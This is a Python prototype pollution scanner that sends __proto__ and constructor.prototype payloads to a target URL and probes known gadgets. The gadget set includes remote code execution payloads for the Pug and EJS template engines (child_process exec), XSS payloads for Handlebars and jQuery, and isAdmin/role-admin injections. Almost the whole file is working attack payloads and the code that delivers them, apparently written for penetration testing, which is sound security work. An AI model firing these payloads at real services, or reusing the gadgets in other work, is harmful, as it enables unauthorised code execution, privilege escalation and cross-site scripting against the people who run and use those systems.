#!/usr/bin/env python3
"""
prototype_pollution.py — Client + Server-Side Prototype Pollution Scanner

Tests: __proto__, constructor.prototype in query params, JSON bodies, path params.
Detects gadgets for XSS/RCE chaining (Lodash, jQuery, Pug, Handlebars).

Usage:
    python3 prototype_pollution.py --url https://target.com/api/merge \
        --method POST --auth "Bearer TOKEN"
"""
import json
import os
import re
import time
from pathlib import Path
from urllib.parse import urlparse, urlencode, quote

try:
    import requests
except ImportError:
    requests = None

# ── Pollution Payloads ─────────────────────────────────────────────────────────

PP_QUERY_PAYLOADS = [
    # Direct __proto__
    "__proto__[polluted]=true",
    "__proto__.polluted=true",
    "__proto__[status]=510",
    "__proto__[constructor][prototype][polluted]=true",

    # Constructor path
    "constructor[prototype][polluted]=true",
    "constructor.prototype.polluted=true",

    # Nested
    "a[__proto__][polluted]=true",
    "a[constructor][prototype][polluted]=true",

    # URL-encoded
    "__proto__%5Bpolluted%5D=true",
    "constructor%5Bprototype%5D%5Bpolluted%5D=true",

    # Double-encoded
    "__proto__%255Bpolluted%255D=true",
]

PP_JSON_PAYLOADS = [
    {"__proto__": {"polluted": "true", "isAdmin": True}},
    {"constructor": {"prototype": {"polluted": "true", "isAdmin": True}}},
    {"a": {"__proto__": {"polluted": "true"}}},
    {"__proto__": {"status": 510}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id')//"}},
]

# ── Known Gadgets (for chaining PP → XSS/RCE) ─────────────────────────────────

KNOWN_GADGETS = {
    "pug_rce": {
        "library": "Pug (formerly Jade)",
        "payload": {"__proto__": {"block": {"type": "Text",
                    "val": "x]});process.mainModule.require('child_process').exec('id');//"}}},
        "severity": "CRITICAL",
        "chain": "PP → RCE via Pug template engine",
    },
    "handlebars_rce": {
        "library": "Handlebars",
        "payload": {"__proto__": {"pendingContent": "<script>alert(1)</script>"}},
        "severity": "HIGH",
        "chain": "PP → XSS via Handlebars template rendering",
    },
    "ejs_rce": {
        "library": "EJS",
        "payload": {"__proto__": {"outputFunctionName":
                    "x;process.mainModule.require('child_process').exec('id')//"}},
        "severity": "CRITICAL",
        "chain": "PP → RCE via EJS template engine",
    },
    "lodash_merge": {
        "library": "Lodash (merge/defaultsDeep)",
        "payload": {"__proto__": {"polluted": True}},
        "severity": "HIGH",
        "chain": "PP → Pollution via Lodash merge",
    },
    "jquery_xss": {
        "library": "jQuery",
        "payload": "__proto__[innerHTML]=<img/src/onerror=alert(1)>",
        "severity": "HIGH",
        "chain": "PP → DOM XSS via jQuery",
    },
    "express_status": {
        "library": "Express.js",
        "payload": {"__proto__": {"status": 510}},
        "severity": "MEDIUM",
        "chain": "PP → DoS via Express status code override",
    },
}


class PrototypePollutionScanner:
    """Detect client and server-side prototype pollution."""

    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None

    def test_query_params(self, url: str, auth_headers: dict = None) -> list[dict]:
        """Test prototype pollution via query parameters (client-side)."""
        auth_headers = auth_headers or {}
        findings = []

        # Get baseline
        try:
            baseline = self.session.get(url, headers=auth_headers, timeout=10)
            baseline_body = baseline.text
            baseline_status = baseline.status_code
            baseline_len = len(baseline_body)
        except Exception:
            return []

        for payload in PP_QUERY_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{payload}"

            try:
                resp = self.session.get(test_url, headers=auth_headers, timeout=8)

                indicators = []

                # Status code change (Express status override)
                if resp.status_code == 510 and baseline_status != 510:
                    indicators.append("status_code_510_express_pollution")

                # Response body contains pollution markers
                if "polluted" in resp.text and "polluted" not in baseline_body:
                    indicators.append("polluted_value_reflected")

                # Significant response change
                if abs(len(resp.text) - baseline_len) > 200:
                    indicators.append("response_length_change")

                # Server error triggered
                if resp.status_code >= 500 and baseline_status < 500:
                    indicators.append("server_error_triggered")

                if indicators:
                    finding = {
                        "type": "PROTOTYPE_POLLUTION_CLIENT",
                        "url": test_url,
                        "payload": payload,
                        "indicators": indicators,
                        "status": resp.status_code,
                        "severity": "HIGH" if "status_code" in str(indicators) else
                                   "MEDIUM",
                    }
                    findings.append(finding)
                    self.findings.append(finding)

            except Exception:
                continue

            time.sleep(0.2)

        return findings

    def test_json_body(self, url: str, method: str = "POST",
                       auth_headers: dict = None,
                       original_body: dict = None) -> list[dict]:
        """Test prototype pollution via JSON body (server-side)."""
        auth_headers = auth_headers or {}
        original_body = original_body or {}
        findings = []

        # Get baseline
        try:
            baseline = self.session.request(method, url, headers=auth_headers,
                                           json=original_body, timeout=10)
            baseline_body = baseline.text
            baseline_status = baseline.status_code
        except Exception:
            return []

        for payload in PP_JSON_PAYLOADS:
            test_body = {**original_body, **payload}

            try:
                resp = self.session.request(method, url, headers=auth_headers,
                                           json=test_body, timeout=8)

                indicators = []

                if resp.status_code == 510 and baseline_status != 510:
                    indicators.append("status_510_server_pollution")

                if "polluted" in resp.text and "polluted" not in baseline_body:
                    indicators.append("polluted_value_in_response")

                if "isAdmin" in resp.text and "isAdmin" not in baseline_body:
                    indicators.append("isAdmin_injected")

                if resp.status_code >= 500 and baseline_status < 500:
                    indicators.append("server_error_from_pollution")

                # Check if subsequent requests are affected (true pollution)
                if indicators:
                    time.sleep(0.5)
                    verify = self.session.request(method, url,
                                                 headers=auth_headers,
                                                 json=original_body, timeout=8)
                    if verify.status_code == 510 or "polluted" in verify.text:
                        indicators.append("PERSISTENT_POLLUTION_CONFIRMED")

                if indicators:
                    finding = {
                        "type": "PROTOTYPE_POLLUTION_SERVER",
                        "url": url,
                        "method": method,
                        "payload": json.dumps(payload),
                        "indicators": indicators,
                        "status": resp.status_code,
                        "severity": "CRITICAL" if "PERSISTENT" in str(indicators) else
                                   "HIGH" if "status_510" in str(indicators) else "MEDIUM",
                    }
                    findings.append(finding)
                    self.findings.append(finding)

            except Exception:
                continue

            time.sleep(0.3)

        return findings

    def test_gadgets(self, url: str, method: str = "POST",
                     auth_headers: dict = None) -> list[dict]:
        """Test known proto pollution gadgets for XSS/RCE chain."""
        auth_headers = auth_headers or {}
        findings = []

        for gadget_name, gadget in KNOWN_GADGETS.items():
            payload = gadget["payload"]

            try:
                if isinstance(payload, dict):
                    resp = self.session.request(method, url,
                                               headers=auth_headers,
                                               json=payload, timeout=8)
                else:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{payload}"
                    resp = self.session.get(test_url, headers=auth_headers,
                                          timeout=8)

                indicators = []

                if resp.status_code >= 500:
                    indicators.append(f"server_crash_{gadget['library']}")
                if "alert" in resp.text or "process.mainModule" in resp.text:
                    indicators.append(f"gadget_payload_reflected")
                if resp.status_code == 510:
                    indicators.append(f"express_status_override")

                if indicators:
                    finding = {
                        "type": "PP_GADGET",
                        "gadget": gadget_name,
                        "library": gadget["library"],
                        "chain": gadget["chain"],
                        "url": url,
                        "indicators": indicators,
                        "severity": gadget["severity"],
                    }
                    findings.append(finding)
                    self.findings.append(finding)

            except Exception:
                continue

            time.sleep(0.3)

        return findings

    def run_all(self, url: str, method: str = "POST",
                auth_headers: dict = None) -> dict:
        """Run all prototype pollution tests."""
        results = {
            "url": url,
            "query_results": self.test_query_params(url, auth_headers),
            "json_results": self.test_json_body(url, method, auth_headers),
            "gadget_results": self.test_gadgets(url, method, auth_headers),
        }

        total_findings = (len(results["query_results"]) +
                         len(results["json_results"]) +
                         len(results["gadget_results"]))
        results["total_findings"] = total_findings
        results["vulnerable"] = total_findings > 0

        return results

    def save_findings(self, target: str) -> None:
        out_dir = Path(f"findings/{target}/prototype_pollution")
        out_dir.mkdir(parents=True, exist_ok=True)
        if self.findings:
            out_file = out_dir / f"pp_results_{int(time.time())}.json"
            out_file.write_text(json.dumps(self.findings, indent=2, default=str))
